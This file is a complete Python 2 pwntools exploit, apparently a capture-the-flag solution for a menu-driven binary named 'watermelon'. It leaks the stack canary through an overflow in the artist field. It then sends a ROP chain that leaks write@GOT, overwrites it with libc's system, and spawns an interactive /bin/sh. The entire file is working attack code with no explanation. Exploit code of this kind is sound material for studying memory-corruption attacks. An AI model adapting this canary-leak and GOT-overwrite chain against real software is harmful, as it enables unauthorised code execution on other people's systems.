#!/usr/bin/env python2
# coding: utf-8

from pwn import *

p = None
e = None

pppr = 0x08048f0d

def set_name(name):
    global p
    p.recvuntil('Input your name : \n')
    p.sendline(name)

def select_menu(idx):
    global p
    p.recvuntil('\tselect\t|\t\n')
    p.sendline(str(idx))
    p.recvuntil('-----------------------------------------------------\n\n\n\n\n\n\n\n')

def add_music(title, artist):
    global p
    select_menu(1)
    p.recvuntil('\tmusic\t|\t')
    p.send(title)
    p.recvuntil('\tartist\t|\t')
    p.send(artist)

def modify_music(idx, title, artist):
    global p
    select_menu(3)
    p.recvuntil('select number\t|\t\n')
    p.sendline(str(idx))

    p.recvuntil('\tmusic\t|\t')
    p.send(title)
    p.recvuntil('\tartist\t|\t')
    p.send(artist)

def get_canary():
    global p
    for _ in range(100):
        add_music('A' * 20, 'B' * 20)

    modify_music(100, 'A' * 20, 'C' * 21)

    select_menu(2)
    p.recvuntil('C' * 21)
    canary = u32(p.recv(3).rjust(4, '\x00'))
    return canary

def exploit(canary):
    global p
    global e

    libc = e.libc
    offset = libc.symbols['write'] - libc.symbols['system']

    bss = e.bss() + 0x100
    binsh = '/bin/sh\x00'

    payload = 'A' * 20
    payload += p32(canary)
    payload += 'A' * 12 # 8bytes dummy + sfp

    # read(0, &bss + 0x100, 8)
    payload += p32(e.plt['read'])
    payload += p32(pppr)
    payload += p32(0)
    payload += p32(bss)
    payload += p32(len(binsh))

    # write(1, &write@got, 4)
    payload += p32(e.plt['write'])
    payload += p32(pppr)
    payload += p32(1)
    payload += p32(e.got['write'])
    payload += p32(4)

    # read(0, &write@got, 4)
    payload += p32(e.plt['read'])
    payload += p32(pppr)
    payload += p32(0)
    payload += p32(e.got['write'])
    payload += p32(4)

    # system("/bin/sh\x00")
    payload += p32(e.plt['write'])
    payload += 'BBBB'
    payload += p32(bss)

    modify_music(100, 'A' * 20, payload)
    select_menu(4)
    log.success('payload sent successfully (%d bytes)' % len(payload))
    log.success('bss : %#x' % bss)

    p.recvuntil('\t\tBYE BYE\n\n')

    p.send(binsh)
    write = u32(p.recv(4))
    system = write - offset

    log.success('write : %#x' % write)
    log.success('system : %#x' % system)
    p.send(p32(system))


def main():
    global p
    global e

    filename = './watermelon'
    e = ELF(filename)
    p = process(e.path)

    set_name('ch4n3')

    canary = get_canary()
    log.success('Leaked canary : {0}'.format(hex(canary)))

    exploit(canary)
    p.interactive()


if __name__ == '__main__':
    main()


